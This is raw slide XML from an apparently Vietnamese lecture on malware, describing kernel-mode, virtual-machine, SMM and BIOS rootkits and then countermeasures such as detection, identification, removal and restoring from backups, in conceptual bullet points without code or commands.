                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hành vi ẩn giấu – Backdoor, rootkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="1453978"/>
            <a:ext cx="5029200" cy="4565822"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kernel mode Rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>user mode </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> kernel mode (thay đổi bên trong kernel và tồn tài cùng mã hệ điều hành)  phát hiện khó h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>n</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>system call l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>à mục tiêu chính của kernel mode rootkit để thực hiện việc che giấu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="240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a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kỹ thuật thay đổi lời gọi hàm</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Chỉnh sửa bảng system call</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Chỉnh sửa các hàm system call tham chiếu đến</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Chuyển h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ớng toàn bộ bảng tham chiếu </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">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A9E47E57-4183-46DA-9E28-4958B390A8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3580" t="13875" r="3580" b="32373"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5240927" y="2209799"/>
            <a:ext cx="6951073" cy="31149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9508156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371600" y="228600"/>
            <a:ext cx="9261024" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Hành vi ẩn giấu – Backdoor, rootkit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1447800"/>
            <a:ext cx="11430000" cy="4565822"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Virtual machine Rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thế hệ rootkit gần đây nhất sử dụng mã hoàn toàn vô hình với hệ điều hành mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Sử dụng một hypervisor hoặc VMM giả mạo hoặc có lỗ hổng, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>thường được </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>trợ giúp </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bởi sự hỗ trợ ảo hóa phần cứng được cung cấp</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trong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>bộ vi xử lý gần đây</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Mã rootkit chạy hoàn toàn bên d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ới tầm nhìn của mã kernel trong hệ điều hành mục tiêu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> OS mục tiêu không biết đang chạy trong một máy ảo  có thể bị giám sát / tấn công</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Ví dụ: SubVirt (2006), Blue Pill</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>Các loại external rootkit khác</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Khai thác SMM trong bộ xử lý Intel mà đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ợc dùng để giám sát phần cứng mức thấp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Khai thác mã BIOS đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ợc sử dụng khi bộ xử lý boot lần đầu</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873088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676400" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1525486"/>
            <a:ext cx="11582400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phòng ngừa: là giải pháp lý tưởng nhưng khó thực hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 4 thành phần của giải pháp ngăn chặn: chính sách, nhận thức, giảm thiểu lỗ hổng, giảm thiểu nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">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altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp thực tế tốt nhất:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phát hiện: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>khi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lây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nhiễm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="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xảy ra, xác định rằng nó đã xảy ra và xác định vị </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>trí </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>malware</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">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Nhận dạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="240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Sau khi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>phát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> được</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="240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xác </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>định </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>mã độc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>cụ thể.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Loại bỏ: Khi đã xác định được mã độc cụ thể, loại bỏ tất cả dấu vết của nó khỏi hệ thống và khôi phục về trạng thái ban đầu. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nếu phát hiện thành công nhưng không nhận dạng hoặc loại bỏ được, biện pháp là loại bỏ chương trình bị nhiễm và tải lại bản sao lưu sạch.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="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812640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676400" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Biện pháp đối phó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="1373086"/>
            <a:ext cx="11582400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Yêu cầu của một biện pháp đối phó v</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ới mã độc hiệu quả: đa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
